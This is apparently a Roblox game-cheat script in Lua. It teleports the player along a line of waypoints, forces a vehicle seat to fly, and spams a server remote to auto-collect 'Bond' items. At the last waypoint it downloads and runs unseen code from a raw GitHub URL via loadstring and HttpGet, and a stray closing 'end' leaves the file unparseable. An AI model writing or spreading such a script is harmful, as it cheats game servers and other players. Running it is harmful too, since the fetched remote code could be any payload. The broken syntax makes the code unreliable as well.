local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

local positions = {
    Vector3.new(57, 3, 30000), Vector3.new(57, 3, 28000),
    Vector3.new(57, 3, 26000), Vector3.new(57, 3, 24000),
    Vector3.new(57, 3, 22000), Vector3.new(57, 3, 20000),
    Vector3.new(57, 3, 18000), Vector3.new(57, 3, 16000),
    Vector3.new(57, 3, 14000), Vector3.new(57, 3, 12000),
    Vector3.new(57, 3, 10000), Vector3.new(57, 3, 8000),
    Vector3.new(57, 3, 6000), Vector3.new(57, 3, 4000),
    Vector3.new(57, 3, 2000), Vector3.new(57, 3, 0),
    Vector3.new(57, 3, -2000), Vector3.new(57, 3, -4000),
    Vector3.new(57, 3, -6000), Vector3.new(57, 3, -8000),
    Vector3.new(57, 3, -10000), Vector3.new(57, 3, -12000),
    Vector3.new(57, 3, -14000), Vector3.new(57, 3, -16000),
    Vector3.new(57, 3, -18000), Vector3.new(57, 3, -20000),
    Vector3.new(57, 3, -22000), Vector3.new(57, 3, -24000),
    Vector3.new(57, 3, -26000), Vector3.new(57, 3, -28000),
    Vector3.new(57, 3, -30000), Vector3.new(57, 3, -32000),
    Vector3.new(57, 3, -34000), Vector3.new(57, 3, -36000),
    Vector3.new(57, 3, -38000), Vector3.new(57, 3, -40000),
    Vector3.new(57, 3, -42000), Vector3.new(57, 3, -44000),
    Vector3.new(57, 3, -46000), Vector3.new(57, 3, -48000),
    Vector3.new(-434, 3, -48998)
}

local WaitTime = 0.9
local BDWaitTime = 0.9

local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:WaitForChild("Humanoid")

local BondFound = {}
local BondCount = 0

local function TPTo(position)
    pcall(function()
        hrp.CFrame = CFrame.new(position)
    end)
end

local function getSeat()
    local gun = workspace:FindFirstChild("RuntimeItems") and workspace.RuntimeItems:FindFirstChild("MaximGun")
    if not gun then return nil end
    local seat = gun:FindFirstChildWhichIsA("VehicleSeat")
    if not seat then return nil end
    return seat
end

local function SitSeat(seat)
    while true do
        if humanoid.SeatPart and humanoid.SeatPart ~= seat then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        if humanoid.SeatPart ~= seat then
            hrp.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
            task.wait(0.2)
        else
            local weld = seat:FindFirstChild("SeatWeld")
            if weld and weld.Part1 and weld.Part1:IsDescendantOf(player.Character) then
                break
            end
        end
    end
end

local function FlySeat(seat, zone)
    for _, p in ipairs(seat:GetDescendants()) do
        if p:IsA("BasePart") then
            p.CanCollide = false
        end
    end

    local bp = Instance.new("BodyPosition")
    bp.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bp.P = 30000
    bp.D = 1000
    bp.Position = seat.Position
    bp.Parent = seat

    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.P = 30000
    bg.D = 1000
    bg.CFrame = seat.CFrame
    bg.Parent = seat

    local moved = false
    local initialPos = seat.Position

    local startTime = tick()
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not seat or not seat.Parent then
            connection:Disconnect()
            return
        end

        bp.Position = zone
        bg.CFrame = CFrame.new(seat.Position, zone)

        local dist = (seat.Position - zone).Magnitude
        if dist < 5 then
            moved = true
            bp:Destroy()
            bg:Destroy()
            connection:Disconnect()
        end

        if tick() - startTime > 1 then
            if (seat.Position - initialPos).Magnitude < 1 then
                connection:Disconnect()
                bp:Destroy()
                bg:Destroy()
            end
        end
    end)

    repeat task.wait() until not connection.Connected
    return moved
end

task.spawn(function()
    TPTo(Vector3.new(57, -5, -9000))
    task.wait(1)

    local seat = getSeat()
    if not seat then
        return
    end
    seat.Disabled = false

    SitSeat(seat)

    local zone = Vector3.new(19, 3, 29870)
    local success = FlySeat(seat, zone)
    if not success then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.5)
    end

    for _, pos in ipairs(positions) do
        TPTo(pos)
        task.wait(WaitTime)

        if pos == Vector3.new(-434, 3, -48998) then
            task.wait(13)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
        end

        local bonds = workspace.RuntimeItems:GetChildren()

        for _, bond in ipairs(bonds) do
            if bond:IsA("Model") and bond.PrimaryPart and (bond.Name == "Bond" or bond.Name == "Bonds") then
                local bondPos = bond.PrimaryPart.Position
                local wasChecked = false

                for _, storedPos in ipairs(BondFound) do
                    if (bondPos - storedPos).Magnitude < 1 then
                        wasChecked = true
                        break
                    end
                end

                if not wasChecked then
                    table.insert(BondFound, bondPos)
                    BondCount = BondCount + 1
                    TPTo(bondPos)
                    task.wait(BDWaitTime)
                    TPTo(pos)
                end
            end
        end
    end
end)

task.spawn(function()
    task.wait(2)
    while true do
        task.wait(0.1)
        local items = workspace:WaitForChild("RuntimeItems")
        for _, bond in pairs(items:GetChildren()) do
            if bond:IsA("Model") and bond.Name == "Bond" and bond.PrimaryPart then
                local dist = (bond.PrimaryPart.Position - hrp.Position).Magnitude
                if dist < 100 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Network"):WaitForChild("RemotePromise"):WaitForChild("Remotes"):WaitForChild("C_ActivateObject"):FireServer(bond)
                end
            end
        end
    end
end)

end
